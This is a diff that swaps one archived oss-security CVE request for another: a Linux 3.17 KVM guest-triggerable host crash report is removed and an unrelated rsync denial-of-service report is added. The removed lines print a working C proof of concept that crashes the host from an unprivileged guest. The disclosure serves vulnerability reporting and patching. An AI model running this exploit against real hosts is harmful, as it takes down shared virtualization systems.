@@ -1,75 +1,33 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2014/10/23/7
-Message-ID: <CALCETrWij0bqmnuboyo7OOjfbdnnzj0ii_mAvqwytvT3WD-+MA@mail.gmail.com>
-Date: Thu, 23 Oct 2014 10:44:42 -0700
-From: Andy Lutomirski <luto@...capital.net>
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2014/04/14/5
+Message-ID: <534BC918.8020904@canonical.com>
+Date: Mon, 14 Apr 2014 07:40:08 -0400
+From: Marc Deslauriers <marc.deslauriers@...onical.com>
 To: oss-security@...ts.openwall.com
-Cc: Paolo Bonzini <pbonzini@...hat.com>, Nadav Amit <nadav.amit@...il.com>
-Subject: CVE Request: Linux 3.17 guest-triggerable KVM OOPS
+Subject: CVE Request: rsync denial of service
 Content-Type: text/plain; charset=utf-8
 
-On Linux 3.17, a KVM guest can trigger a NULL pointer dereference by
-forcing the host to emulate certain well-formed RIP-relative
-instructions or certain types of corrupt or page-straddling
-instructions.  This is almost certainly just a DoS -- there is a
-single read-modify-write to the NULL pointer, and no kernel code will
-consume data loaded from the NULL pointer if something is mapped
-there.
+Hello,
 
-The bugs, or at least dangerous code, arguably existed in much older
-kernels, but the NULL pointer dereference was introduced in
-41061cdb98a0bec464278b4db8e894a3121671f5, which is only present in
-3.17.
+Ryan Finnie discovered that rsync 3.1.0 contains a denial of service issue when
+attempting to authenticate using a nonexistent username. A remote attacker could
+use this flaw to cause a denial of service via CPU consumption.
 
-To fix it, you can either revert the broken patch or you can apply
-both patches here as well as the attached patch:
-http://thread.gmane.org/gmane.comp.emulators.kvm.devel/128427
-(NB: I'm not sure whether "Emulator does not decode clflush well" is necessary.)
+Bug reports:
+https://bugzilla.samba.org/show_bug.cgi?id=10551
+https://bugs.launchpad.net/ubuntu/+source/rsync/+bug/1307230
 
-Details:
+Fix:
+https://git.samba.org/?p=rsync.git;a=commitdiff;h=0dedfbce2c1b851684ba658861fe9d620636c56a
 
-Depending on your point of view, there are either one or two bugs
-here.  Nadav Amit discovered an error in the instruction decoder that
-would cause certain RIP-relative instructions to OOPS the decoder.
-Specifically, rather than adding RIP to the operand address, RIP would
-be added to *0 from the host's perspective.
 
-I wrote an ugly proof-of-concept to trigger it (kvm_clflush_oops.c,
-although I've cleaned it up somewhat since I originally wrote it).
-That PoC only works on an SMP guest, and only when run as root.
+Could a CVE please be assigned to this issue?
 
-I also discovered that Nadav's fix was incomplete (or that there was
-another bug, depending on your perspective).  Certain invalid
-instructions (due to multiple error cases, including a failure to
-fetch part of the instruction or due to the instruction being too
-long) could trigger the same NULL pointer dereference.
+Thanks,
 
-Nadav wrote an extremely elegant PoC that exploits this buggy error
-handling, reproduced with permission below.  This PoC doesn't require
-SMP or privilege; it's just crashes the host directly.  Figuring out
-how it works is left as an exercise to the reader (hint: it might not
-work on Atom hosts).
+Marc.
 
-Please assign one or two CVEs as appropriate.  (And, if you're hosting
-untrusted code on a Linux 3.17 host, patch your system!)
-
-#include <sys/mman.h>
-#include <stdlib.h>
-#include <string.h>
-
-int main()
-{
-        void *mem = mmap(NULL, 8192, PROT_EXEC | PROT_READ | PROT_WRITE,
-                        MAP_ANON | MAP_PRIVATE | MAP_POPULATE, -1, 0);
-        memcpy((char*)mem + 0xff3,
-            "\xf0\x65\x65\x65\x65\x65\x65\x0f\x38\xf1"
-            "\x05\x00\x00\x00\x00\x00", 15);
-        asm volatile(“jmp *%0\n\t” : : "r" (mem+0xff3));
-        return 0;
-}
-
---Andy
-
-View attachment "kvm_fix.patch" of type "text/x-patch" (1150 bytes)
-
-View attachment "kvm_clflush_oops.c" of type "text/x-csrc" (766 bytes)
+-- 
+Marc Deslauriers
+Ubuntu Security Engineer     | http://www.ubuntu.com/
+Canonical Ltd.               | http://www.canonical.com/
